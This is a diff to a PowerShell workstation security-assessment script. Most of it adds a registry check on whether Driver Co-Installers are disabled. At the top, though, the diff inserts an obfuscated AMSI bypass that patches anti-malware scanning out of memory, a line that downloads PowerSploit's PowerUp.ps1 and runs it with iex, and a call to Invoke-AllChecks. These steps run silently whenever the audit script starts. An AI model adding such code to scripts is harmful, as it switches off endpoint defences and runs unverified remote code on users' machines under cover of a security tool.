@@ -6,6 +6,10 @@ Stop-Transcript | out-null
 $ErrorActionPreference = "Continue"
 Start-Transcript -path ".\Invoke-WorkstatationAssessment.log" -append
 
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+iex(New-Object Net.WebClient).DownloadString("https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/PowerUp.ps1")
+Invoke-AllChecks -ErrorAction SilentlyContinue -HTMLReport
+
 Function Get-BadPrivilege
 {
 
@@ -2267,6 +2271,40 @@ if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
      }
  } else {
         $strAuditCheckResult='Anonymous enumeration of shares is allowed'
+        Write-Host $strAuditCheckResult -ForegroundColor Red
+        Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
+ }
+
+####################### Driver Co-Installers ###################################################
+$strSecurityItem = "Driver Co-Installers"
+$strSecurityItemCheck = "Driver Co-Installers should be disabled to prevent privileged installation of vulnerable device drivers"
+Write-Host '######################################' -BackgroundColor Black
+Write-Host '##    Driver Co-Installers          ##' -BackgroundColor Black
+Write-Host '######################################' -BackgroundColor Black
+Write-Host 'Checking if Driver Co-Installers are disabled' -ForegroundColor Black -BackgroundColor White
+
+$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Installer\"
+$regPathProperty = "DisableCoInstallers"
+
+if((Test-RegistryValue -Path $regPath -Name $regPathProperty)){
+    $check = Get-ItemProperty -Path $regPath | Select-Object -ExpandProperty $regPathProperty -ErrorAction silentlycontinue
+    Switch($check)
+    {
+        '1'
+         {
+            $strAuditCheckResult='Driver Co-Installers are disabled'
+            Write-Host $strAuditCheckResult -ForegroundColor Green
+            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $true
+         }
+         '0'
+         {
+            $strAuditCheckResult='Driver Co-Installers are enabled'
+            Write-Host $strAuditCheckResult -ForegroundColor Red
+            Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
+         }
+     }
+ } else {
+        $strAuditCheckResult='Not set - Windows 10 Default: Driver Co-Installers are enabled'
         Write-Host $strAuditCheckResult -ForegroundColor Red
         Add-SecurityCheckItem -SecurityItem $strSecurityItem -SecurityItemCheck $strSecurityItemCheck -AuditCheckResult $strAuditCheckResult -AuditCheckPass $false
  }
